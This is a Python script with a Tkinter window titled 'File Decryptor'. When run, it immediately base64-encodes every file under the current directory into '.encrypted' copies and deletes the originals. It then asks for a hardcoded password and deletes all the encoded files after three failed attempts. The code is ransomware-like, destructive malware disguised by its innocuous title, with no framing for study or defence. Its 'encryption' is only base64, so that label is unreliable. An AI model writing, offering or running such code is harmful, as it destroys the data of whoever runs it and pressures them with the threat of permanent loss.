import os
import tkinter as tk
from tkinter import filedialog, simpledialog, messagebox
import base64

# Specify the password directly in the script
PASSWORD = "12345"

# Function to prompt for password
def prompt_for_password(attempts_remaining):
    password = simpledialog.askstring("Password", f"Enter the password (Attempts remaining: {attempts_remaining}):", show='*')
    return password

# Function to show encryption confirmation dialogue
def show_encryption_confirmation():
    messagebox.showinfo("Encryption Complete", "All files and directories have been encrypted.")

# Function to show decryption confirmation dialogue
def show_decryption_confirmation():
    messagebox.showinfo("Decryption Complete", "All files and directories have been decrypted.")

# Function to encrypt content
def encrypt_content(content, password):
    try:
        encrypted_content = base64.b64encode(content)
        return encrypted_content
    except Exception as e:
        print(f"Error encrypting content: {e}")
        return None

# Function to encrypt a file
def encrypt_file(file_path, password):
    with open(file_path, "rb") as file:
        content = file.read()
    encrypted_content = encrypt_content(content, password)
    if encrypted_content:
        encrypted_file_path = file_path + ".encrypted"
        with open(encrypted_file_path, "wb") as file:
            file.write(encrypted_content)
        print("File encrypted successfully:", encrypted_file_path)
        # Remove the original file
        os.remove(file_path)
        print("Original file deleted:", file_path)

# Function to handle encryption of files and directories
def encrypt_all_files(directory="."):
    for root, dirs, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            encrypt_file(file_path, PASSWORD)
    show_encryption_confirmation()

# Function to decrypt content
def decrypt_content(content, password):
    try:
        decrypted_content = base64.b64decode(content)
        return decrypted_content
    except Exception as e:
        print(f"Error decrypting content: {e}")
        return None

# Function to decrypt a file
def decrypt_file(file_path, password):
    with open(file_path, "rb") as file:
        content = file.read()
    decrypted_content = decrypt_content(content, password)
    if decrypted_content:
        file_name, _ = os.path.splitext(file_path)
        with open(file_name, "wb") as file:
            file.write(decrypted_content)
        print("File decrypted successfully:", file_name)
        # Remove the encrypted file
        os.remove(file_path)
        print("Encrypted file deleted:", file_path)

# Function to handle decryption of all files
def decrypt_all_files():
    attempts = 0
    max_attempts = 3
    while attempts < max_attempts:
        password = prompt_for_password(max_attempts - attempts)
        if password == PASSWORD:
            for root, dirs, files in os.walk("."):
                for filename in files:
                    if filename.endswith(".encrypted"):
                        file_path = os.path.join(root, filename)
                        decrypt_file(file_path, password)
            show_decryption_confirmation()
            return
        else:
            attempts += 1
            if attempts == max_attempts:
                messagebox.showwarning("Too Many Attempts", "You've exceeded the maximum number of attempts. All encrypted files will be deleted.")
                for root, dirs, files in os.walk("."):
                    for filename in files:
                        if filename.endswith(".encrypted"):
                            os.remove(os.path.join(root, filename))
                break
            else:
                messagebox.showerror("Invalid Password", "Incorrect password provided. Please try again.")

# Create the main Tkinter window
root = tk.Tk()
root.title("File Decryptor")

# Create a button to decrypt all files at once
decrypt_all_button = tk.Button(root, text="Decrypt All Files", command=decrypt_all_files)
decrypt_all_button.pack(padx=10, pady=20)

# Encrypt all files in the current directory upon running the script
encrypt_all_files()

# Run the Tkinter event loop
root.mainloop()

